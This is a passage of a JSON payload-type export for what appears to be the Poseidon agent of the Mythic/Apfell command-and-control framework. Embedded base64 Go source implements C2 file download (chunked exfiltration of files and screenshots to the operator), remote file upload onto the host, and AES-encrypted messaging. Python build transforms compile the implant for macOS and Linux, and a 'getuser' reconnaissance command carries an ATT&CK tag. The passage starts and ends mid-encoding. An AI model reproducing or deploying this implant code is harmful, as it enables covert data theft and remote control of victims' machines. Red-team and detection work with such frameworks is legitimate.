0KSBHZXRGaWxlKHRhc2sgc3RydWN0cy5UYXNrLCBmaWxlRGV0YWlscyBzdHJ1Y3RzLkZpbGVVcGxvYWRQYXJhbXMsIGNoIGNoYW4gW11ieXRlKSB7CgoJZmlsZVVwbG9hZE1zZyA6PSBzdHJ1Y3RzLkZpbGVVcGxvYWRDaHVua01lc3NhZ2V7fSAvL0NyZWF0ZSB0aGUgZmlsZSB1cGxvYWQgY2h1bmsgbWVzc2FnZQoJZmlsZVVwbG9hZE1zZy5BY3Rpb24gPSAidXBsb2FkIgoJZmlsZVVwbG9hZE1zZy5GaWxlSUQgPSBmaWxlRGV0YWlscy5GaWxlSUQKCWZpbGVVcGxvYWRNc2cuQ2h1bmtTaXplID0gMTAyNDAwMAoJZmlsZVVwbG9hZE1zZy5DaHVua051bSA9IDEKCWZpbGVVcGxvYWRNc2cuRnVsbFBhdGggPSBmaWxlRGV0YWlscy5SZW1vdGVQYXRoCglmaWxlVXBsb2FkTXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJbXNnLCBfIDo9IGpzb24uTWFyc2hhbChmaWxlVXBsb2FkTXNnKQoJbXUuTG9jaygpCglVcGxvYWRSZXNwb25zZXMgPSBhcHBlbmQoVXBsb2FkUmVzcG9uc2VzLCBtc2cpCgltdS5VbmxvY2soKQoJLy8gV2FpdCBmb3IgcmVzcG9uc2UgZnJvbSBhcGZlbGwKCXJhd0RhdGEgOj0gPC1jaAoKCWZpbGVVcGxvYWRNc2dSZXNwb25zZSA6PSBzdHJ1Y3RzLkZpbGVVcGxvYWRDaHVua01lc3NhZ2VSZXNwb25zZXt9IC8vIFVubWFyc2hhbCB0aGUgZmlsZSB1cGxvYWQgcmVzcG9uc2UgZnJvbSBhcGZlbGwKCWVyciA6PSBqc29uLlVubWFyc2hhbChyYXdEYXRhLCAmZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlKQoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB1bm1hcnNoYWxpbmcgdGFzayByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWYsIGVyciA6PSBvcy5DcmVhdGUoZmlsZURldGFpbHMuUmVtb3RlUGF0aCkKCWlmIGVyciAhPSBuaWwgewoJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgY3JlYXRpbmcgZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJZGVmZXIgZi5DbG9zZSgpCglkZWNvZGVkLCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlLkNodW5rRGF0YSkKCglfLCBlcnIgPSBmLldyaXRlKGRlY29kZWQpCgoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB3cml0aW5nIHRvIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCgoJb2Zmc2V0IDo9IGludDY0KGxlbihkZWNvZGVkKSkKCWlmIGZpbGVVcGxvYWRNc2dSZXNwb25zZS5Ub3RhbENodW5rcyA+IDEgewoJCWZvciBpbmRleCA6PSAyOyBpbmRleCA8PSBmaWxlVXBsb2FkTXNnUmVzcG9uc2UuVG90YWxDaHVua3M7IGluZGV4KysgewoJCQlmaWxlVXBsb2FkTXNnID0gc3RydWN0cy5GaWxlVXBsb2FkQ2h1bmtNZXNzYWdle30KCQkJZmlsZVVwbG9hZE1zZy5BY3Rpb24gPSAidXBsb2FkIgoJCQlmaWxlVXBsb2FkTXNnLkNodW5rTnVtID0gaW5kZXgKCQkJZmlsZVVwbG9hZE1zZy5DaHVua1NpemUgPSAxMDI0MDAwCgkJCWZpbGVVcGxvYWRNc2cuRmlsZUlEID0gZmlsZURldGFpbHMuRmlsZUlECgkJCWZpbGVVcGxvYWRNc2cuRnVsbFBhdGggPSBmaWxlRGV0YWlscy5SZW1vdGVQYXRoCgkJCWZpbGVVcGxvYWRNc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCgkJCW1zZywgXyA6PSBqc29uLk1hcnNoYWwoZmlsZVVwbG9hZE1zZykKCQkJbXUuTG9jaygpCgkJCVVwbG9hZFJlc3BvbnNlcyA9IGFwcGVuZChVcGxvYWRSZXNwb25zZXMsIG1zZykKCQkJbXUuVW5sb2NrKCkKCQkJcmF3RGF0YSA6PSA8LWNoCgkJCS8vcmF3RGF0YSA6PSBjLmh0bWxHZXREYXRhKGZtdC5TcHJpbnRmKCIlcyVzIiwgYy5CYXNlVVJMLCB1cmwpLCBtc2cpCgkJCWZpbGVVcGxvYWRNc2dSZXNwb25zZSA9IHN0cnVjdHMuRmlsZVVwbG9hZENodW5rTWVzc2FnZVJlc3BvbnNle30gLy8gVW5tYXJzaGFsIHRoZSBmaWxlIHVwbG9hZCByZXNwb25zZSBmcm9tIGFwZmVsbAoJCQllcnIgOj0ganNvbi5Vbm1hcnNoYWwocmF3RGF0YSwgJmZpbGVVcGxvYWRNc2dSZXNwb25zZSkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIG1hcnNoYWxpbmcgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgkJCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJCQltdS5Mb2NrKCkKCQkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCQkJLy8gQmFzZTY0IGRlY29kZSB0aGUgY2h1bmsgZGF0YQoJCQlkZWNvZGVkLCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlLkNodW5rRGF0YSkKCgkJCV8sIGVyciA9IGYuV3JpdGVBdChkZWNvZGVkLCBvZmZzZXQpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCQkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB3cml0aW5nIHRvIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJCQltdS5Mb2NrKCkKCQkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCgkJCW9mZnNldCA9IG9mZnNldCArIGludDY0KGxlbihkZWNvZGVkKSkKCQl9Cgl9CgoJcmVzcCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCXJlc3AuVXNlck91dHB1dCA9ICJGaWxlIHVwbG9hZCBjb21wbGV0ZSIKCXJlc3AuQ29tcGxldGVkID0gdHJ1ZQoJcmVzcC5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJZW5jUmVzcCwgZXJyIDo9IGpzb24uTWFyc2hhbChyZXNwKQoJbXUuTG9jaygpCglUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVuY1Jlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0KCi8vU2VuZEZpbGVDaHVua3MgLSBIZWxwZXIgZnVuY3Rpb24gdG8gZGVhbCB3aXRoIGZpbGUgY2h1bmtzIChzY3JlZW5zaG90cyBhbmQgZmlsZSBkb3dubG9hZHMpCmZ1bmMgKGMgKkMyRGVmYXVsdCkgU2VuZEZpbGVDaHVua3ModGFzayBzdHJ1Y3RzLlRhc2ssIGZpbGVEYXRhIFtdYnl0ZSwgY2ggY2hhbiBbXWJ5dGUpIHsKCglzaXplIDo9IGxlbihmaWxlRGF0YSkKCgljb25zdCBmaWxlQ2h1bmsgPSA1MTIwMDAgLy9Ob3JtYWwgYXBmZWxsIGNodW5rIHNpemUKCWNodW5rcyA6PSB1aW50NjQobWF0aC5DZWlsKGZsb2F0NjQoc2l6ZSkgLyBmaWxlQ2h1bmspKQoKCWNodW5rUmVzcG9uc2UgOj0gc3RydWN0cy5GaWxlRG93bmxvYWRJbml0aWFsTWVzc2FnZXt9CgljaHVua1Jlc3BvbnNlLk51bUNodW5rcyA9IGludChjaHVua3MpCgljaHVua1Jlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgljaHVua1Jlc3BvbnNlLkZ1bGxQYXRoID0gdGFzay5QYXJhbXMKCgltc2csIF8gOj0ganNvbi5NYXJzaGFsKGNodW5rUmVzcG9uc2UpCgltdS5Mb2NrKCkKCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgbXNnKQoJbXUuVW5sb2NrKCkKCgl2YXIgZmlsZURldGFpbHMgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoJLy8gV2FpdCBmb3IgYSByZXNwb25zZSBmcm9tIHRoZSBjaGFubmVsCgoJZm9yIHsKCQlyZXNwIDo9IDwtIGNoCgkJZXJyIDo9IGpzb24uVW5tYXJzaGFsKHJlc3AsICZmaWxlRGV0YWlscykKCQlpZiBlcnIgIT0gbmlsIHsKCQkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB1bm1hcnNoYWxpbmcgdGFzayByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoKCQkJbXUuTG9jaygpCgkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCW11LlVubG9jaygpCgkJCXJldHVybgoJCX0KCQkKCQkvL2xvZy5QcmludGYoIlJlY2VpdmUgZmlsZSBkb3dubG9hZCByZWdpc3RyYXRpb24gcmVzcG9uc2UgJXNcbiIsIHJlc3ApCgkJaWYgXywgb2sgOj0gZmlsZURldGFpbHNbImZpbGVfaWQiXTsgb2sgewoJCQlpZiBvayB7CgkJCQkvL2xvZy5QcmludGxuKCJGb3VuZCByZXNwb25zZSB3aXRoIGZpbGVfaWQga2V5ICIsIGZpbGVpZCkKCQkJCWJyZWFrCgkJCX0gZWxzZSB7CgkJCQkvL2xvZy5QcmludGxuKCJEaWRuJ3QgZmluZCByZXNwb25zZSB3aXRoIGZpbGVfaWQga2V5IikKCQkJCWNvbnRpbnVlCgkJCX0KCQl9Cgl9CgkKCgkKCXIgOj0gYnl0ZXMuTmV3QnVmZmVyKGZpbGVEYXRhKQoJLy8gU2xlZXAgaGVyZSBzbyB3ZSBkb24ndCBzcGFtIGFwZmVsbAoJLy90aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCkKCglmb3IgaSA6PSB1aW50NjQoMCk7IGkgPCBjaHVua3M7IGkrKyB7CgkJLy9sb2cuUHJpbnRsbigiSW5kZXggIiwgaSkKCQlwYXJ0U2l6ZSA6PSBpbnQobWF0aC5NaW4oZmlsZUNodW5rLCBmbG9hdDY0KGludDY0KHNpemUpLWludDY0KGkqZmlsZUNodW5rKSkpKQoJCXBhcnRCdWZmZXIgOj0gbWFrZShbXWJ5dGUsIHBhcnRTaXplKQoJCS8vIENyZWF0ZSBhIHRlbXBvcmFyeSBidWZmZXIgYW5kIHJlYWQgYSBjaHVuayBpbnRvIHRoYXQgYnVmZmVyIGZyb20gdGhlIGZpbGUKCQlfLCBfID0gci5SZWFkKHBhcnRCdWZmZXIpCgkJCgoJCW1zZyA6PSBzdHJ1Y3RzLkZpbGVEb3dubG9hZENodW5rTWVzc2FnZXt9CgkJbXNnLkNodW5rTnVtID0gaW50KGkpICsgMQoJCW1zZy5GaWxlSUQgPSBmaWxlRGV0YWlsc1siZmlsZV9pZCJdLihzdHJpbmcpCgkJbXNnLkNodW5rRGF0YSA9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhwYXJ0QnVmZmVyKQoJCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCQllbmNtc2csIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVuY21zZykKCQltdS5VbmxvY2soKQoKCQkvLyBXYWl0IGZvciBhIHJlc3BvbnNlIGZvciBvdXIgZmlsZSBjaHVuawoJCXZhciBwb3N0UmVzcCBtYXBbc3RyaW5nXWludGVyZmFjZXt9CgkJZm9yIHsKCQkJZGVjUmVzcCA6PSA8LWNoCgkJCWVyciA6PSBqc29uLlVubWFyc2hhbChkZWNSZXNwLCAmcG9zdFJlc3ApLy8gV2FpdCBmb3IgYSByZXNwb25zZSBmb3Igb3VyIGZpbGUgY2h1bmsKCQkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHVubWFyc2hhbGluZyB0YXNrIHJlc3BvbnNlOiAlcyIsIGVyci5FcnJvcigpKQoJCQkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCQkJbXUuTG9jaygpCgkJCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCQkJbXUuVW5sb2NrKCkKCQkJCXJldHVybgoJCQl9CgoJCQkvL2xvZy5QcmludGYoIlJlY2VpdmVkIGNodW5rIGRvd25sb2FkIHJlc3BvbnNlICVzXG4iLCBkZWNSZXNwKQoJCQlpZiBfLCBvayA6PSBwb3N0UmVzcFsic3RhdHVzIl07IG9rIHsKCQkJCWlmIG9rIHsKCQkJCQkvL2xvZy5QcmludGxuKCJGb3VuZCByZXNwb25zZSB3aXRoIHN0YXR1cyBrZXk6ICIsIHN0YXR1cykKCQkJCQlicmVhawoJCQkJfSBlbHNlIHsKCQkJCQkvL2xvZy5QcmludGxuKCJEaWRuJ3QgZmluZCByZXNwb25zZSB3aXRoIHN0YXR1cyBrZXkiKQoJCQkJCWNvbnRpbnVlCgkJCQl9CgkJCX0KCQl9CgkJCgoJCWlmICFzdHJpbmdzLkNvbnRhaW5zKHBvc3RSZXNwWyJzdGF0dXMiXS4oc3RyaW5nKSwgInN1Y2Nlc3MiKSB7CgkJCS8vIElmIHRoZSBwb3N0IHdhcyBub3Qgc3VjY2Vzc2Z1bCwgd2FpdCBhbmQgdHJ5IHRvIHNlbmQgaXQgb25lIG1vcmUgdGltZQoJCQkKCQkJbXUuTG9jaygpCgkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZW5jbXNnKQoJCQltdS5VbmxvY2soKQoJCX0KCgkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpCgl9CgoJci5SZXNldCgpCglyID0gbmlsCglmaWxlRGF0YSA9IG5pbAoKICAgIGZpbmFsIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJZmluYWwuQ29tcGxldGVkID0gdHJ1ZQoJZmluYWwuVGFza0lEID0gdGFzay5UYXNrSUQKCWZpbmFsLlVzZXJPdXRwdXQgPSAiZmlsZSBkb3dubG9hZGVkIgoJZmluYWxFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGZpbmFsKQoJLy9jLlBvc3RSZXNwb25zZSh0YXNrLCBzdHJpbmcoZmluYWxFbmMpKQoJbXUuTG9jaygpCglUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGZpbmFsRW5jKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9CgpmdW5jIChjICpDMkRlZmF1bHQpIGVuY3J5cHRNZXNzYWdlKG1zZyBbXWJ5dGUpIFtdYnl0ZSB7CglrZXksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhjLktleSkKCXJldHVybiBjcnlwdG8uQWVzRW5jcnlwdChrZXksIG1zZykKfQoKZnVuYyAoYyAqQzJEZWZhdWx0KSBkZWNyeXB0TWVzc2FnZShtc2cgW11ieXRlKSBbXWJ5dGUgewoJa2V5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoYy5LZXkpCglyZXR1cm4gY3J5cHRvLkFlc0RlY3J5cHQoa2V5LCBtc2cpCn0="
          }
        ]
      },
      "load_transforms": [],
      "create_transforms": [
        {
          "parameter": "amd64",
          "description": "Choose the target architecture",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 3
        },
        {
          "parameter": "darwin\nlinux",
          "description": "Choose the target OS.",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 2
        },
        {
          "parameter": "default\nwebsocket",
          "description": "Choose the C2 profile you're using.",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 1
        },
        {
          "parameter": "",
          "description": "This does the final compilation based on the above choices.",
          "transform": "poseidon_compile_and_return",
          "parameter_type": "None",
          "order": 5
        },
        {
          "parameter": "default\nc-archive",
          "description": "Choose the buildmode option. Default for executables, c-archive\/archive\/c-shared\/shared are for libraries",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 4
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIGJhc2U2NGVuY29kZShzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IFBhcmFtZXRlck5hbWUpIC0+IHN0cjoKICAgIGltcG9ydCBqc29uCiAgICBwYXJhbV9kaWN0ID0ganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykKICAgIGVuY29kZWQgPSBiYXNlNjQuYjY0ZW5jb2RlKHN0ci5lbmNvZGUocGFyYW1fZGljdFtwYXJhbWV0ZXJdKSkuZGVjb2RlKCd1dGYtOCcpCiAgICBwYXJhbV9kaWN0W3BhcmFtZXRlcl0gPSBlbmNvZGVkCiAgICByZXR1cm4ganNvbi5kdW1wcyhwYXJhbV9kaWN0KQ==",
          "name": "base64encode",
          "parameter_type": "String",
          "description": "base64 encode the parameter",
          "is_command_code": true,
          "timestamp": "03\/20\/2020 01:02:00",
          "id": 14,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==",
          "name": "save_parameter",
          "parameter_type": "ChooseOne",
          "description": "Save a value as the next element in self.saved_array",
          "is_command_code": false,
          "timestamp": "03\/20\/2020 01:01:59",
          "id": 8,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHBvc2VpZG9uX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6CiAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgIT0gNDoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzBdCiAgICBvcGVyYXRpbmdfc3lzdGVtID0gc2VsZi5zYXZlZF9hcnJheVsxXQogICAgYXJjaCA9IHNlbGYuc2F2ZWRfYXJyYXlbMl0KICAgIG1vZGUgPSBzZWxmLnNhdmVkX2FycmF5WzNdCiAgICBjb21tYW5kID0gIm12IHt9LmdvIHBrZy9wcm9maWxlcy87IHJtIC1yZiAvYnVpbGQ7IHJtIC1yZiAvZGVwczsgcm0gLXJmIC9nby9zcmMvcG9zZWlkb247Ii5mb3JtYXQocHJvZmlsZSkKICAgIGNvbW1hbmQgKz0gIm1rZGlyIC1wIC9nby9zcmMvcG9zZWlkb24vc3JjOyBtdiAqIC9nby9zcmMvcG9zZWlkb24vc3JjOyBtdiAvZ28vc3JjL3Bvc2VpZG9uL3NyYy9wb3NlaWRvbi5nbyAvZ28vc3JjL3Bvc2VpZG9uLzsiCiAgICBjb21tYW5kICs9ICJjZCAvZ28vc3JjL3Bvc2VpZG9uOyBleHBvcnQgR09QQVRIPS9nby9zcmMvcG9zZWlkb247IgogICAgaWYgcHJvZmlsZSA9PSAid2Vic29ja2V0IjoKICAgICAgICBjb21tYW5kICs9ICJnbyBnZXQgLXUgZ2l0aHViLmNvbS9nb3JpbGxhL3dlYnNvY2tldDsiCiAgICBjb21tYW5kICs9ICJ4Z28gLXRhZ3M9e30gLS10YXJnZXRzPXt9L3t9IC1idWlsZG1vZGU9e30gLW91dCBwb3NlaWRvbiAuIi5mb3JtYXQocHJvZmlsZSwgb3BlcmF0aW5nX3N5c3RlbSwgYXJjaCwgbW9kZSkKICAgIHByb2MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKGNvbW1hbmQsIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwgY3dkPXNlbGYud29ya2luZ19kaXIpCiAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2MuY29tbXVuaWNhdGUoKQogICAgaWYgc3Rkb3V0OgogICAgICAgIHByaW50KGYnW3N0ZG91dF1cbntzdGRvdXQuZGVjb2RlKCl9JykKICAgIGlmIHN0ZGVycjoKICAgICAgICBwcmludChmJ1tzdGRlcnJdXG57c3RkZXJyLmRlY29kZSgpfScpCiAgICBpZiBvcy5wYXRoLmV4aXN0cygiL2J1aWxkIik6CiAgICAgICAgZmlsZXMgPSBvcy5saXN0ZGlyKCIvYnVpbGQiKQogICAgICAgIGlmIGxlbihmaWxlcykgPT0gMToKICAgICAgICAgICAgcmV0dXJuIGJ5dGVhcnJheShvcGVuKCIvYnVpbGQvIiArIGZpbGVzWzBdLCAncmInKS5yZWFkKCkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdGVtcF91dWlkID0gc3RyKHV1aWQudXVpZDQoKSkKICAgICAgICAgICAgc2h1dGlsLm1ha2VfYXJjaGl2ZSh0ZW1wX3V1aWQsICJ6aXAiLCAiL2J1aWxkIikKICAgICAgICAgICAgcmV0dXJuIGJ5dGVhcnJheShvcGVuKHRlbXBfdXVpZCArICIuemlwIiwgJ3JiJykucmVhZCgpKQogICAgZWxzZToKICAgICAgICAjIHNvbWV0aGluZyB3ZW50IHdyb25nLCByZXR1cm4gb3VyIGVycm9ycwogICAgICAgIHJhaXNlIEV4Y2VwdGlvbihzdGRlcnIuZGVjb2RlKCkp",
          "name": "poseidon_compile_and_return",
          "parameter_type": "None",
          "description": "Compile Poseidon payload and return result",
          "is_command_code": false,
          "timestamp": "03\/20\/2020 01:02:00",
          "id": 15,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "getuser",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get information regarding the current user context.",
          "cmd": "getuser",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1033",
              "attack_name": "System Owner\/User Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "getuser.go": "cGFja2FnZSBnZXR1c2VyCgppbXBvcnQgKAoJImVuY29kaW5nL2pzb24iCgkib3MvdXNlciIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCSJwa2cvcHJvZmlsZXMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp0eXBlIFNlcmlhbGl6YWJsZVVzZXIgc3RydWN0IHsKCS8vIFVpZCBpcyB0aGUgdXNlciBJRC4KCS8vIE9uIFBPU0lYIHN5c3RlbXMsIHRoaXMgaXMgYSBkZWNpbWFsIG51bWJlciByZXByZXNlbnRpbmcgdGhlIHVpZC4KCS8vIE9uIFdpbmRvd3MsIHRoaXMgaXMgYSBzZWN1cml0eSBpZGVudGlmaWVyIChTSUQpIGluIGEgc3RyaW5nIGZvcm1hdC4KCS8vIE9uIFBsYW4gOSwgdGhpcyBpcyB0aGUgY29udGVudHMgb2YgL2Rldi91c2VyLgoJVWlkIHN0cmluZyBganNvbjoidWlkImAKCS8vIEdpZCBpcyB0aGUgcHJpbWFyeSBncm91cCBJRC4KCS8vIE9uIFBPU0lYIHN5c3RlbXMsIHRoaXMgaXMgYSBkZWNpbWFsIG51bWJlciByZXByZXNlbnRpbmcgdGhlIGdpZC4KCS8vIE9uIFdpbmRvd3MsIHRoaXMgaXMgYSBTSUQgaW4gYSBzdHJpbmcgZm9ybWF0LgoJLy8gT24gUGxhbiA5LCB0aGlzIGlzIHRoZSBjb250ZW50cyBvZiAvZGV2L3VzZXIuCglHaWQgc3RyaW5nIGBqc29uOiJnaWQiYAoJLy8gVXNlcm5hbWUgaXMgdGhlIGxvZ2luIG5hbWUuCglVc2VybmFtZSBzdHJpbmcgYGpzb246InVzZXJuYW1lImAKCS8vIE5hbWUgaXMgdGhlIHVzZXIncyByZWFsIG9yIGRpc3BsYXkgbmFtZS4KCS8vIEl0IG1pZ2h0IGJlIGJsYW5rLgoJLy8gT24gUE9TSVggc3lzdGVtcywgdGhpcyBpcyB0aGUgZmlyc3QgKG9yIG9ubHkpIGVudHJ5IGluIHRoZSBHRUNPUyBmaWVsZAoJLy8gbGlzdC4KCS8vIE9uIFdpbmRvd3MsIHRoaXMgaXMgdGhlIHVzZXIncyBkaXNwbGF5IG5hbWUuCgkvLyBPbiBQbGFuIDksIHRoaXMgaXMgdGhlIGNvbnRlbnRzIG9mIC9kZXYvdXNlci4KCU